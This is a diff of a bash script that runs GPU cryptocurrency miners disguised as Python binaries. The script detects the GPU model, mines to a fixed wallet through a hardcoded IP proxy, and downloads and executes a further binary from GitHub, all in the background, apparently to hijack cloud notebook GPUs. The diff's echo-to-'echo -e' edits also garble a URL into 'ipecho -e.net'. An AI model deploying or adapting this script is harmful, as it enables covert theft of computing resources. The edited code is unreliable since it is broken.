@@ -2,14 +2,14 @@
 
 
 
-echo '##########################################################################'
+echo -e '##########################################################################'
 PROX=78.47.69.185
 RVPort=80
-echo '################## '"RV to $PROX:$RVPort"' Ver:0.0.6     ################'
-echo '##########################################################################'
+echo -e '################## '"RV to $PROX:$RVPort"' Ver:0.0.6     ################'
+echo -e '##########################################################################'
 
 ## getting IP info
-iip=$(curl -s https://ipecho.net/plain)
+iip=$(curl -s https://ipecho -e.net/plain)
 IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
@@ -95,7 +95,7 @@ On_IWhite='\033[0;107m'   # White
 
 
 
-echo > oout
+echo -e > oout
 
 rm -rf python2.6.6
 rm -rf pythonoc
@@ -110,33 +110,33 @@ do
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
 
-echo "${On_IGreen}"'                                  #########################'
-echo "####################### P100-PCIE #########################"
-echo '#######################                                    '"${Color_Off}"
+echo -e "${On_IGreen}"'                                  #########################'
+echo -e "####################### P100-PCIE #########################"
+echo -e '#######################                                    '"${Color_Off}"
 nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@$PROX:$RVPort  -U 2>> oout 1>> oout &
 
 elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
 then
-echo "${ON_IBlue}"'                                  #########################'
-echo "#######################        T4        #########################"
-echo '#######################                                    '"${Color_Off}"
+echo -e "${ON_IBlue}"'                                  #########################'
+echo -e "#######################        T4        #########################"
+echo -e '#######################                                    '"${Color_Off}"
 nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@$PROX:$RVPort  -G  2>> oout 1>> oout &
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
-echo "${ON_IRed}"'                            #########################'
-echo "#######################    K80     #########################"
-echo '#######################                                    '"${Color_Off}"
+echo -e "${ON_IRed}"'                            #########################'
+echo -e "#######################    K80     #########################"
+echo -e '#######################                                    '"${Color_Off}"
 nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@$PROX:$RVPort  -G 2>> oout 1>> oout &
 elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
 then
-echo "${On_IYellow}"'                                   ########################'
-echo "#######################    P4     #########################"
-echo '#######################                                    '"${Color_Off}"
+echo -e "${On_IYellow}"'                                   ########################'
+echo -e "#######################    P4     #########################"
+echo -e '#######################                                    '"${Color_Off}"
 nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P4_$IPNAME@$PROX:$RVPort  -U 2>> oout 1>> oout &
 else
-echo "${On_IBlack}"'                                     #########################'
-echo "#######################     Other    #########################"
-echo '#######################                                       '"${Color_Off}"
+echo -e "${On_IBlack}"'                                     #########################'
+echo -e "#######################     Other    #########################"
+echo -e '#######################                                       '"${Color_Off}"
 nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@$PROX:$RVPort  -G 2>> oout 1>> oout &
 wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
 chmod +x pythoncpu
@@ -147,12 +147,12 @@ fi
     while true
     do
         i=$[$i+1]
-        echo "${BIBlack}Results ${On_Green} $i ${Color_Off}:  ${BICyan} $(grep Acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i*6400] ${Color_Off}" 
+        echo -e "${BIBlack}Results ${On_Green} $i ${Color_Off}:  ${BICyan} $(grep Acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i*6400] ${Color_Off}" 
         sleep 30
     done
 
 
-echo "#######################   Process  Killed    #########################"
+echo -e "#######################   Process  Killed    #########################"
                   
 done
 tail -f oout
